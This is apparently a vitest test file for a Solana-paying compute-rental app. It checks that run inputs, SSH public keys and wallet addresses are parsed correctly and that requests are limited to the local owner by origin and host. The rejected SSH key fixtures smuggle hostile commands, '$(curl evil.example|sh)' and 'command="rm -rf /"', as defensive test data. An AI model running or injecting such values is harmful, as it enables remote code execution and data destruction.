import { describe, expect, it } from "vitest";
import { checkRequest, findPaymentFor, isOwner, parseRunInput, secretFor, walletReady, sshPublicKeyOf } from "./session";

const good = {
  market: "test",
  need: { kind: "cpu", vcpus: 1, ramGb: 1, vramGb: 0, hours: 1, regions: [], allowSpot: false },
  budgetUsd: 1,
  rateUsdHr: 0.05,
  askBeforePaying: true,
};

const req = (headers: Record<string, string>) => new Request("http://127.0.0.1:3000/api/market/run", { method: "POST", headers: { host: "127.0.0.1:3000", "content-length": "2", ...headers }, body: "{}" });

describe("parseRunInput", () => {
  it("accepts the brief's example run", () => {
    const r = parseRunInput(good);
    expect(r).toEqual({ ok: true, value: { market: "test", need: good.need, limits: { budgetUsd: 1, rateUsdHr: 0.05 }, askBeforePaying: true, wallet: null, sshPublicKey: null } });
  });

  it("takes the renter's own SSH public key, one line, and never anything else", () => {
    const ed = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq0m0b1x0u2r3n4t5e6s7t8k9e0y1a2b3c4d5e6f7g8h9 me@laptop";
    expect(parseRunInput({ ...good, sshPublicKey: `  ${ed}\n` })).toMatchObject({ ok: true, value: { sshPublicKey: ed } });
    expect(parseRunInput({ ...good })).toMatchObject({ ok: true, value: { sshPublicKey: null } });
    expect(parseRunInput({ ...good, sshPublicKey: "" })).toMatchObject({ ok: true, value: { sshPublicKey: null } });
    expect(sshPublicKeyOf(`ssh-rsa ${"A".repeat(372)}`)).not.toBeNull();
    expect(sshPublicKeyOf(`ecdsa-sha2-nistp256 ${"A".repeat(140)}= key`)).not.toBeNull();
    const bad = [
      "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----",
      `${ed}\nssh-ed25519 AAAAsecondline`,
      "ssh-ed25519 short",
      `ssh-dss ${"A".repeat(100)}`,
      `ssh-ed25519 ${"A".repeat(80)} $(curl evil.example|sh) ${"x".repeat(90)}`,
      `ssh-ed25519 ${"A".repeat(1400)}`,
      "command=\"rm -rf /\" ssh-ed25519 " + "A".repeat(68),
      42,
      {},
    ];
    for (const v of bad) {
      expect(sshPublicKeyOf(v)).toBeNull();
      expect(parseRunInput({ ...good, sshPublicKey: v }).ok).toBe(false);
    }
  });

  it("takes a connected wallet to pay from, and then always asks before paying", () => {
    const wallet = "4zMMC9srt5Ri5X14GAgXhaHii3GnPAEERYPJgZJDncDU";
    const r = parseRunInput({ ...good, askBeforePaying: false, wallet });
    expect(r.ok && r.value.wallet).toBe(wallet);
    expect(r.ok && r.value.askBeforePaying).toBe(true);
    // without a wallet the choice stands
    const plain = parseRunInput({ ...good, askBeforePaying: false, wallet: null });
    expect(plain.ok && plain.value.askBeforePaying).toBe(false);
    for (const bad of ["", "nope", 42, "0x52908400098527886E0F7030069857D2E4169EE7", {}]) {
      expect(parseRunInput({ ...good, wallet: bad })).toEqual({ ok: false, error: "that is not a Solana wallet address" });
    }
  });

  it.each([
    [{ market: "main" }, "market"],
    [{ budgetUsd: 0.001 }, "budget"],
    [{ budgetUsd: 21 }, "budget"],
    [{ rateUsdHr: 0.0005 }, "hourly limit"],
    [{ rateUsdHr: 2 }, "hourly limit"],
    [{ askBeforePaying: "yes" }, "ask before paying"],
    [{ need: { ...good.need, vcpus: 0 } }, "vCPUs"],
    [{ need: { ...good.need, vcpus: 1.5 } }, "vCPUs"],
    [{ need: { ...good.need, ramGb: 0.25 } }, "RAM"],
    [{ need: { ...good.need, vramGb: 201 } }, "GPU memory"],
    [{ need: { ...good.need, hours: 73 } }, "hours"],
    [{ need: { ...good.need, hours: 0.001 } }, "hours"],
    [{ need: { ...good.need, regions: Array.from({ length: 11 }, () => "ewr") } }, "at most 10"],
    [{ need: { ...good.need, regions: ["EWR"] } }, "region name"],
    [{ need: { ...good.need, kind: "tpu" } }, "CPU or GPU"],
    [{ need: { ...good.need, allowSpot: 1 } }, "interruptible"],
  ])("rejects %j", (patch, words) => {
    const r = parseRunInput({ ...good, ...patch });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain(words);
  });

  it("drops extra need fields", () => {
    const r = parseRunInput({ ...good, need: { ...good.need, evil: true } });
    expect(r.ok && Object.keys(r.value.need)).toEqual(["kind", "vcpus", "ramGb", "vramGb", "hours", "regions", "allowSpot"]);
  });
});

describe("checkRequest", () => {
  it("allows same-origin and origin-less JSON", () => {
    expect(checkRequest(req({ "content-type": "application/json" }))).toBeNull();
    expect(checkRequest(req({ "content-type": "application/json", origin: "http://localhost:3000" }))).toBeNull();
  });
  it("refuses another website with 403", () => {
    expect(checkRequest(req({ "content-type": "application/json", origin: "https://evil.example" }))?.status).toBe(403);
  });
  it("allows both local host names", () => {
    expect(checkRequest(req({ "content-type": "application/json", host: "localhost:3000" }))).toBeNull();
    expect(isOwner(req({ host: "127.0.0.1:3000" }))).toBe(true);
    // the same local name arriving through a tunnel is not the owner, and is refused
    expect(isOwner(req({ host: "127.0.0.1:3000", "cf-connecting-ip": "203.0.113.9" }))).toBe(false);
    expect(checkRequest(req({ "content-type": "application/json", "cf-connecting-ip": "203.0.113.9" }))?.status).toBe(403);
  });
  it("refuses a body with no stated size with 411 (a chunked body would be read whole)", () => {
    const r = new Request("http://127.0.0.1:3000/api/market/run", { method: "POST", headers: { host: "127.0.0.1:3000", "content-type": "application/json" }, body: "{}" });
    expect(checkRequest(r)?.status).toBe(411);
    expect(checkRequest(req({ "content-type": "application/json", "content-length": "abc" }))?.status).toBe(411);
  });
  it("refuses a body that is too large with 413", () => {
    expect(checkRequest(req({ "content-type": "application/json", "content-length": "20000" }))?.status).toBe(413);
  });
  it.each(["evil.example:3000", "127.0.0.1", "localhost:3001", "127.0.0.1:3000.evil.example", "LOCALHOST:3000.x", ""])("refuses Host %j with 403 even for same-origin JSON", (host) => {
    const r = checkRequest(req({ "content-type": "application/json", origin: "http://127.0.0.1:3000", host }));
    expect(r?.status).toBe(403);
  });
  it("refuses a request with no Host header", () => {
    const r = new Request("http://127.0.0.1:3000/api/market/run", { method: "POST", headers: { "content-type": "application/json" }, body: "{}" });
    expect(r.headers.get("host")).toBeNull();
    expect(checkRequest(r)?.status).toBe(403);
  });
  it("refuses a non-JSON body with 415", () => {
    expect(checkRequest(req({ "content-type": "text/plain" }))?.status).toBe(415);
  });
});

describe("wallets from env", () => {
  it("the real market falls back to the agent key", () => {
    expect(secretFor("real", { AGENT_SOLANA_SECRET_KEY: "a" })).toBe("a");
    expect(secretFor("real", { AGENT_SOLANA_SECRET_KEY: "a", MAINNET_SOLANA_SECRET_KEY: "m" })).toBe("m");
    expect(secretFor("test", { MAINNET_SOLANA_SECRET_KEY: "m" })).toBeNull();
  });
  it("walletReady says whether a key is configured", () => {
    expect(walletReady({})).toEqual({ test: false, real: false });
    expect(walletReady({ AGENT_SOLANA_SECRET_KEY: "a", SOLANA_RECEIVER_ADDRESS: "r" })).toEqual({ test: true, real: true });
  });
});

describe("findPaymentFor", () => {
  it("reads the market's own RPC and USDC mint", async () => {
    const seen: { url: string; method: string; params: unknown[] }[] = [];
    const f = (async (input: RequestInfo | URL, init?: RequestInit) => {
      const { method, params } = JSON.parse(String(init?.body));
      seen.push({ url: String(input), method, params });
      return new Response(JSON.stringify({ jsonrpc: "2.0", id: 1, result: { value: [] } }));
    }) as typeof fetch;
    expect(await findPaymentFor("test", f)({ payer: "P", payTo: "R", atomic: "10382", sinceMs: 1 })).toBeNull();
    expect(seen).toEqual([{ url: "https://api.devnet.solana.com", method: "getTokenAccountsByOwner", params: ["P", { mint: "4zMMC9srt5Ri5X14GAgXhaHii3GnPAEERYPJgZJDncDU" }, { encoding: "jsonParsed" }] }]);
    await findPaymentFor("real", f)({ payer: "P", payTo: "R", atomic: "1", sinceMs: 1 });
    expect(seen[1]).toMatchObject({ url: "https://api.mainnet-beta.solana.com", params: ["P", { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" }, { encoding: "jsonParsed" }] });
  });
});
